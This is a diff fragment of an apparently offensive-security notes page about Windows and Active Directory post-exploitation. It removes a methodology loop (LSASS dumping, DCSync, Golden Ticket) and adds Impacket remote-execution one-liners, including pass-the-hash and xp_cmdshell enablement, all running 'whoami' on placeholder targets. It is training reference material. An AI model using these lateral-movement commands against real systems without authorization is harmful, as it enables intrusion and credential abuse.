+impacket-atexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP' 'whoami'
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
+**dcomexec.py**
 
-**Original note sections:** [Active Directory Attack Path: Worked Lab — ⏱️ HOW TO USE THIS — decision header ("if you have X, do Y")](/cheatsheets/ad-attack-path-worked-example#-how-to-use-this-—-decision-header-if-you-have-x-do-y) · [Windows Post-Exploitation: Field Reference — ⏱️ DECISION HEADER — "I have a shell, now what?"](/cheatsheets/windows-post-exploitation#-decision-header-—-i-have-a-shell-now-what) · [Windows Post-Exploitation: Field Reference — 🧠 The Windows post-ex mindset](/cheatsheets/windows-post-exploitation#-the-windows-post-ex-mindset) · [Common Services: Personal Assessment Notes — Phase 6 — Post-Exploitation: Confirming Privilege Level](/modules/common-services/assessment#phase-6-—-post-exploitation-confirming-privilege-level) · [Privilege Escalation: Choose a Checklist — Windows](/privesc/index#windows) · [Windows Privilege Escalation: Full Checklist — Existing notes and worked examples](/privesc/windows-privesc-checklist#existing-notes-and-worked-examples) · [Windows Privilege Escalation: Full Checklist — Juicy Potato (Abusing the golden privileges)](/privesc/windows-privesc-checklist#juicy-potato-abusing-the-golden-privileges)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Active Directory Attack Path: Worked Lab**
-
-Context from the notebook: Golden rule of order on any new host:   enumerate before you exploit.  On Windows the first three commands are always  whoami /priv ,  whoami /groups ,  whoami /all  — they decide your entire privesc path (see  8 ).
-
-```text
-whoami /groups
+```bash
+impacket-dcomexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP' 'whoami'
 ```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — ⏱️ HOW TO USE THIS — decision header ("if you have X, do Y")](/cheatsheets/ad-attack-path-worked-example#-how-to-use-this-—-decision-header-if-you-have-x-do-y) · [Windows Post-Exploitation: Field Reference — ⏱️ DECISION HEADER — "I have a shell, now what?"](/cheatsheets/windows-post-exploitation#-decision-header-—-i-have-a-shell-now-what) · [Privilege Escalation: Choose a Checklist — Windows](/privesc/index#windows) · [Windows Privilege Escalation: Full Checklist — Existing notes and worked examples](/privesc/windows-privesc-checklist#existing-notes-and-worked-examples)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Active Directory Attack Path: Worked Lab**
-
-Context from the notebook: Golden rule of order on any new host:   enumerate before you exploit.  On Windows the first three commands are always  whoami /priv ,  whoami /groups ,  whoami /all  — they decide your entire privesc path (see  8 ).
-
-```text
-whoami /all
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — ⏱️ HOW TO USE THIS — decision header ("if you have X, do Y")](/cheatsheets/ad-attack-path-worked-example#-how-to-use-this-—-decision-header-if-you-have-x-do-y) · [AD Lab Guide — Full Reference — Identify token groups and privileges](/lab-guide/reference#identify-token-groups-and-privileges)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
 
 </Accordion>
 
-<Accordion title="🧠 Methodology distilled (memorize this loop)">
+<Accordion title="Run a single task action and inspect its identity">
 
-### 🧠 Methodology distilled (memorize this loop)
+### Run a single task action and inspect its identity
 
-**Active Directory Attack Path: Worked Lab**
+**atexec.py**
 
-Context from the notebook: Foothold  → 2.  Enumerate the host  (Linux: history/configs/sudo/keytabs · Windows:  whoami /priv|/groups ) → 3.  Pivot  if internal → 4.  Enumerate AD  (nxc users/shares/policy + BloodHound) → 5.  Loot & crack  (shares, vaults) → 6.  Escalate  (SeImpersonate→SYSTEM, dump LSASS) → 7.  Find the privileged credential  (BloodHound path member / DA in LSASS) → 8.  DCSync  → 9.  Persist  (krbtgt = Golden Ticket).
-
-```text
-whoami /priv|/groups
+```bash
+impacket-atexec 'DOMAIN/USER@TARGET_IP' 'whoami'
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
+</Accordion>
 
-**Original note sections:** [Active Directory Attack Path: Worked Lab — 🧠 Methodology distilled (memorize this loop)](/cheatsheets/ad-attack-path-worked-example#-methodology-distilled-memorize-this-loop)
+<Accordion title="Verify execution through a supported DCOM object">
 
-{/* VAULT_ORIGINAL_LINK_END */}
+### Verify execution through a supported DCOM object
 
+**dcomexec.py**
+
+```bash
+impacket-dcomexec 'DOMAIN/USER@TARGET_IP' 'whoami'
+```
+
+</Accordion>
+
+<Accordion title="OS command — requires appropriate SQL privileges">
+
+### OS command — requires appropriate SQL privileges
+
+**mssqlclient.py**
+
+```text
+enable_xp_cmdshell
+xp_cmdshell whoami
+```
+
+</Accordion>
+
+<Accordion title="Verify remote service execution identity">
+
+### Verify remote service execution identity
+
+**psexec.py**
+
+```bash
+impacket-psexec 'DOMAIN/USER@TARGET_IP' whoami
+```
+
+</Accordion>
+
+<Accordion title="Run one command through WMI">
+
+### Run one command through WMI
+
+**wmiexec.py**
+
+```bash
+impacket-wmiexec 'DOMAIN/USER@TARGET_IP' whoami
+```
 
 </Accordion>
 
@@ -1405,6 +2095,10 @@ nt authority\system
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -1412,5 +2106,3 @@ nt authority\system
 - [Enumerate Active Directory with Built-in Tools](/active-directory/living-off-the-land)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
